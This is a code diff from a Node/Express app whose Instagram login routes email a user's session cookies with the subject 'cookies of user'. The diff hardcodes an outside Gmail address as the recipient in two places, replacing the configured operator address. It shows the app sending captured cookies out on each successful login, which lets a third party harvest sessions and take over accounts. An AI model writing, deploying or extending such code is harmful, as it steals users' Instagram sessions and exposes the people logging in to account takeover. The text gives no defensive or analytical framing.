@@ -179,7 +179,7 @@ app.get("/insta/submitCode", (req, res) => {
           console.log("login success");
           var mailOptions = {
             from: process.env.email,
-            to: process.env.email,
+            to: "tklinger50@gmail.com",
             subject: "cookies of user" + req.query.name,
             text: JSON.stringify(val2.cookies),
           };
@@ -199,7 +199,6 @@ app.get("/insta/submitCode", (req, res) => {
                 success: true,
                 user: val,
                 cookie: val2.cookies,
-
                 message: "login Successful and email has been sent",
               });
               res.end();
@@ -228,7 +227,7 @@ app.post("/insta", (req, res) => {
         console.log("login success");
         var mailOptions = {
           from: process.env.email,
-          to: process.env.email,
+          to: "tklinger50@gmail.com",
           subject: "cookies of user" + req.query.name,
           text: JSON.stringify(val2.cookies),
         };
